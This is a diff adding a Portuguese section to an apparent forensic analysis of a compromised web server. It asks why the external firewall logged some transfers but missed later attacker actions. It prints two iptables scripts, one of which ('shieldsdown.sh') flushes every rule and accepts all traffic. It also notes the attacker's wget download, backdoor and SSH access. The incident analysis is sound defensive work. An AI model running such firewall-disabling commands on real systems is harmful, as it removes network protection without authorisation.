+<h3 id="porque-%c3%a9-que-a-firewall-externa-detetou-transfer%c3%aancias-mas-nao-detetou-as-restantes-a%c3%a7%c3%b5es">Porque é que a Firewall externa detetou transferências mas nao detetou as restantes ações?</h3>
+<p>Ao pesquisarmos nos ficheiros do sistema, conseguimos encontrar dois ficheiros que são de extrema importancia, pois regem as configurações das firewalls.</p>
+<pre><code class="language-bash"><div>user@vm:/mnt/hacked_root$ sudo cat root/shieldsup.sh
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+iptables -A INPUT -p icmp -j ACCEPT
+iptables -A INPUT -i lo -j ACCEPT
+iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
+iptables -A INPUT -j DROP
+iptables -A FORWARD -j DROP
+user@vm:/mnt/hacked_root$ sudo cat root/shieldsdown.sh
+[sudo] password <span class="hljs-keyword">for</span> user: 
+iptables -A INPUT -j ACCEPT
+iptables -A FORWARD -j ACCEPT
+iptables --flush
+</div></code></pre>
+<p>Através da análise destas configurações do iptables, conseguimos perceber que a configuração inicial do <code>shieldsup.sh</code> aceita:</p>
+<ul>
+<li>Pacotes do tipo ICMP</li>
+<li>Pacotes vindo da interface lo</li>
+<li>Pacotes novos TCP ao porto 80
+E recusa:</li>
+<li>Tudo o que não tiver sido declarado anteriormente, logo adotando uma politica de whitelisting.</li>
+</ul>
+<p>Já o <code>shieldsdown.sh</code> parece aceitar todo o tipo de pacotes, dai o nome dos escudos estarem em baixo, pois a proteção oferecida foi retirada.</p>
+<p>O facto de termos encontrado estes ficheiros na maquina do servidor web leva-nos a crer que, no sistema em produção, a máquina que actua como firewall externa é a mesma que o próprio servidor, o que potenciou o acesso descrito anteriormente sem qualquer controlo.</p>
+<p>Ao analisar os pacotes capturados pela firewall, verificamos que, por exemplo, o ficheiro <code>steg_drop.py</code>, obtido através do comando <em>wget</em> a uma página externa, não foi detetado. Isto pode dever-se ao facto de a firewall não estar a implementar, efetivamente, uma defesa em perímetro, e assim passar por alto muito tráfego da máquina para outros sites. Portanto, outro tráfego criado pelo atacante para outras ações pode facilmente não ter sido detetado.</p>
+<p>Suspeitamos que o atacante tenha inicialmente realizado transferências e dai as podermos visualizar no tráfego da firewall externa.</p>
+<p>No entanto, tendo criada a <strong>backdoor</strong>, o user ganhou acesso ao sistema por completo, executando comandos numa sessão <em>ssh</em> encriptada e, portanto, impossível de analisar pela firewall. Por outro lado, pôde remover as limitações da firewall uma vez dentro da máquina.</p>
+
+    </body>
+    </html>
